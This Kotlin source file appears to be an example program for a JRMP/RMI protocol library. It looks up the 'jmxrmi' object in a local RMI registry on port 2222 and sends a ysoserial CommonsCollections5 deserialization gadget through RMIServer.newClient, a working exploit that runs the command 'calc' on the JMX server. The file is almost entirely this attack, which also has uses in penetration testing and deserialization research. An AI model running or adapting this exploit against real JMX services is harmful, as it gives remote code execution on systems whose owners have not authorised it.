package example.jmx

import sun.rmi.server.UnicastRef
import top.ceclin.jrmp.RegistryV2
import top.ceclin.jrmp.ext.jrmpHash
import top.ceclin.jrmp.ext.tcpEndpoint
import top.ceclin.jrmp.request.Request
import top.ceclin.jrmp.request.request
import top.ceclin.jrmp.request.rmiCall
import top.ceclin.jrmp.request.singleOp
import top.ceclin.jrmp.response.Return
import ysoserial.payloads.CommonsCollections5
import java.lang.reflect.Proxy
import java.net.Socket
import java.rmi.server.RemoteObject
import javax.management.remote.rmi.RMIServer

fun main() {
    val liveRef = Socket("127.0.0.1", 2222).use {
        it.tcpNoDelay = true
        val request: Request = RegistryV2.lookup {
            writeObject("jmxrmi")
        }.singleOp().request()
        println(request.value.contentToString())
        it.outputStream.write(request.value)
        val bytes = it.inputStream.readBytes()
        val ret = Return.decode(bytes)
        println(ret.isSuccess)
        val result = ret.stream.readObject()
        println(result)
        val remote = (result.takeUnless { Proxy.isProxyClass(it.javaClass) }
            ?: Proxy.getInvocationHandler(result)) as RemoteObject
        val ref = remote.ref as UnicastRef
        ref.liveRef
    }
    val tcpEndpoint = liveRef.tcpEndpoint
    Socket(tcpEndpoint.host, tcpEndpoint.port).use {
        it.tcpNoDelay = true
        val method = RMIServer::class.java.getMethod("newClient", Any::class.java)
        val request: Request = rmiCall(liveRef.objID, method.jrmpHash) {
            writeObject(CommonsCollections5().getObject("calc"))
        }.singleOp().request()
        it.outputStream.write(request.value)
        val bytes = it.inputStream.readBytes()
        val ret = Return.decode(bytes)
        println(ret.isSuccess)
        val result = ret.stream.readObject()
        println(result)
    }
}


